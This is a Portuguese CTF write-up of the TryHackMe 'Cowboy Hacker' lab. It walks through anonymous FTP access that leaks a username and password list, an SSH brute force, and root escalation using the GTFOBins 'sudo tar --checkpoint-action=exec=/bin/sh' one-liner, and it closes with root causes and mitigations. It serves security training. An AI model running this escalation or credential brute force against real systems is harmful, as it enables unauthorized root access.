# Cowboy Hacker — TryHackMe

**Plataforma:** TryHackMe
**Máquina:** Cowboy Hacker
**SO:** Linux
**Data:** 20/07/2026
**Tags:** #recon #CTF
**Status:** Concluída ✅

## TL;DR

O acesso inicial explora um servidor **FTP (vsftpd 3.0.5) com login anonymous habilitado**. Dentro do FTP havia dois arquivos de texto claro — `task.txt`, revelando o nome de um usuário do sistema (`lin`), e `locks.txt`, contendo uma lista de possíveis senhas. Com esses dois artefatos foi possível montar um brute force de credenciais contra o serviço **SSH**, obtendo acesso inicial como `lin` e a flag de usuário.

A escalada de privilégios explora uma entrada de `sudo -l` mal configurada: o usuário `lin` pode executar `/bin/tar` como root sem senha adicional (via política sudo). O `tar` possui uma opção documentada no **GTFOBins** (`--checkpoint`/`--checkpoint-action=exec=`) que permite executar comandos arbitrários durante a operação de arquivamento — como o processo herda o contexto do sudo, o comando é executado como root, permitindo leitura de `root.txt` e comprometimento total da máquina.

**Cadeia de ataque:** FTP anonymous login → Vazamento de usuário/senhas em arquivos texto → Brute force SSH → Acesso como `lin` → `sudo -l` (tar sem restrição) → GTFOBins (`tar --checkpoint-action=exec=`) → root

---

## 1. Recon

### 1.1 Enumeração com Nmap

IP alvo: `10.64.166.178`

```
# Nmap 7.99 scan initiated Tue Jul 21 14:41:50 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC -oN cowboyhacker.txt 10.64.166.178
Nmap scan report for 10.64.166.178
Host is up (0.14s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.155.175
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:3d:22:ab:36:61:82:36:d8:b1:21:3a:12:94:fa:4f (RSA)
|   256 06:f0:33:69:91:11:e6:5b:53:a9:ab:91:22:2e:3b:4b (ECDSA)
|_  256 e3:6f:92:12:10:e9:07:68:f8:1c:32:9e:5a:a7:e1:e3 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 21 14:42:16 2026 -- 1 IP address (1 host up) scanned in 25.62 seconds
```

Três portas abertas: **FTP (21)** com vsftpd 3.0.5 e **login anonymous permitido** (`ftp-anon: Anonymous FTP login allowed`), **SSH (22)** com OpenSSH 8.2p1, e **HTTP (80)** com Apache 2.4.41. O FTP anonymous é o ponto de entrada mais óbvio e foi o primeiro vetor explorado.

---

## 2. Foothold (acesso inicial)

### 2.1 Login anonymous no FTP

```
┌──(gabriel㉿gabriel)-[~/Documents/Study/cowboyhacker]
└─$ ftp 10.64.166.178
Connected to 10.64.166.178.
220 (vsFTPd 3.0.5)
Name (10.64.166.178:gabriel): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |***************************************************************************************|   418        7.38 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (2.65 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |***************************************************************************************|    68        2.02 MiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.46 KiB/s)
ftp> exit
221 Goodbye.
```

O login como `anonymous` foi aceito de imediato, permitindo baixar dois arquivos: `locks.txt` e `task.txt`. Em `task.txt` estava o nome de um usuário do sistema (`lin`), e `locks.txt` continha uma lista de possíveis senhas em texto claro.

> **Ponto de interesse:** nunca armazenar senhas em texto claro em locais acessíveis, especialmente em um servidor FTP com acesso anonymous habilitado.

### 2.2 Brute force SSH e acesso como `lin`

Com o usuário (`lin`) e a wordlist de senhas (`locks.txt`) em mãos, foi montado um ataque de força bruta contra o serviço SSH, obtendo acesso válido ao sistema como `lin`.

Com a sessão SSH estabelecida, foi possível ler o arquivo `user.txt` e capturar a flag de usuário do desafio.

---

## 3. Escalada de privilégios

### 3.1 Enumerando permissões sudo

A primeira tentativa de localizar `root.txt` por busca direta não teve sucesso — o arquivo exige permissões elevadas para ser encontrado e lido:

```
find / -name root* 2>/dev/null
find / -iname "root*" 2>/dev/null
```

Partindo então para a enumeração de privilégios do usuário `lin`:

```
lin@ip-10-64-166-178:~/.local$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-64-166-178:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-64-166-178:
    (root) /bin/tar
```

O usuário `lin` pode executar `/bin/tar` como root via `sudo`, sem qualquer restrição de argumentos. `tar` é um binário conhecido na base **GTFOBins**: possui uma flag de checkpoint (`--checkpoint`) capaz de disparar a execução de um comando arbitrário (`--checkpoint-action=exec=`) durante a operação de arquivamento. Como o processo roda com privilégios de root via sudo, o comando executado herda o mesmo contexto.

### 3.2 Explorando o GTFOBins do `tar` → root

Sintaxe utilizada:

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Execução completa e leitura da flag final:

```
lin@ip-10-64-166-178:~/.local$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# cat /root/root.txt
THM{80UN...K3r}
# Connection to 10.64.166.178 closed by remote host.
Connection to 10.64.166.178 closed.
```

---

## 4. Causa raiz e mitigação

| # | Vulnerabilidade | Causa raiz | Mitigação |
|---|---|---|---|
| 1 | FTP anonymous com dados sensíveis | vsftpd configurado para permitir login `anonymous`, expondo um diretório com arquivos contendo usuário e lista de senhas em texto claro | Desabilitar login anonymous no FTP (ou migrar para SFTP/FTPS); nunca armazenar credenciais em texto claro em qualquer serviço acessível |
| 2 | Senhas fracas / reuso, permitindo brute force SSH | Ausência de política de bloqueio de tentativas (rate limiting/lockout) e senha presente em wordlist previsível | Implementar `fail2ban` ou equivalente, exigir MFA no SSH, aplicar política de senhas fortes e únicas |
| 3 | Regra de `sudo` excessivamente permissiva | Usuário `lin` autorizado a rodar `/bin/tar` como root sem restrição de argumentos, permitindo abuso via GTFOBins | Nunca conceder `sudo` irrestrito a binários com funcionalidades de execução de comando (`tar`, `less`, `vim`, `find`, etc.); usar `sudo` com argumentos fixos/whitelisted ou capabilities específicas em vez do binário completo |

---

## 5. Lições aprendidas

- Serviços FTP com login anonymous habilitado são, na prática, um diretório público — qualquer arquivo salvo ali deve ser tratado como exposto publicamente.
- Nunca armazenar credenciais (usuários, senhas, wordlists) em texto claro em qualquer local acessível por serviços de rede, mesmo que pareça um "esconderijo".
- Antes de conceder qualquer regra de `sudo`, verificar o binário-alvo no **GTFOBins** — muitos utilitários legítimos (`tar`, `find`, `less`, `vim`, `awk`) possuem funcionalidades de shell/exec embutidas que quebram completamente o isolamento de privilégios.
- Aplicar o princípio de zero-trust a todos os usuários, mesmo os que já possuem acesso válido ao sistema.
